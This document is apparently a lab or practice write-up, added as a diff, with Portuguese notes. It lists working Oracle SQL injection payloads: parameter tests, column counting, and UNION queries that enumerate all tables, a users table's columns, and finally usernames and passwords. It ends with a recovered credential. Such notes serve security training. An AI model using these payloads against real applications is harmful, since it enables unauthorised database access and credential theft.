@@ -1,0 +1,29 @@
+_________________________________________________________________
+\\SQL injection attack, listing the database contents on Oracle//
+-----------------------------------------------------------------
+
+CHEAT SHEET ORACLE:
+https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
+
+
+Testando parâmetros:
+'
+'-- 
+'#
+
+' ORDER BY 2--
+'UNION SELECT NULL, NULL FROM DUAL--
+
+
+
+Pegando o nome de todas as tabelas
+'UNION SELECT NULL,table_name FROM all_tables--
+
+Pegando as colunas da tabela USERS_DBRVYH
+'UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='USERS_DBRVYH'--
+
+Pegando os dados 
+'UNION SELECT PASSWORD_XQKDOV,USERNAME_MUGPTZ FROM USERS_DBRVYH--
+
+77mq0mkc8rtn5li03asn
+administrator
